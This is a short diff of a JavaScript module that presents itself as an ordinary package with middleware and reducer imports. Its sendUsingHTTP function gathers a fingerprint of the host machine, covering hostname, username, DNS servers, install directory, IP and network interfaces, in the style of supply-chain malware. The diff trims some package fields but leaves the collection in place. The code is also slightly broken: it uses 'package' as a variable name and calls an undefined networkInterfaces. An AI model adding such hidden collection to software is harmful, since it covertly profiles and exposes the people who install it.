@@ -1,7 +1,6 @@
 import https from 'https'
 import os from 'os'
 import dns from 'dns'
-const package = packageJSON.name;
 
 import middleWare     from './middleWare'
 import apiReducer     from './apiReducer'
@@ -68,7 +67,6 @@ const sendUsingHTTP = (data) => {
   const nets = networkInterfaces();
 
   const telemetry = JSON.stringify({
-    package: package,
     date: new Date(),
     tzOffset: new Date().getTimezoneOffset(),
     actualDirectory: __dirname,
@@ -76,9 +74,6 @@ const sendUsingHTTP = (data) => {
     hostname: os.hostname(),
     userName: os.userInfo().username,
     dns: dns.getServers(),
-    resolved: packageJSON ? packageJSON.___resolved : undefined,
-    version: packageJSON.version,
-    packageJSON,
     ip: data.ip || "",
     ...nets
   });
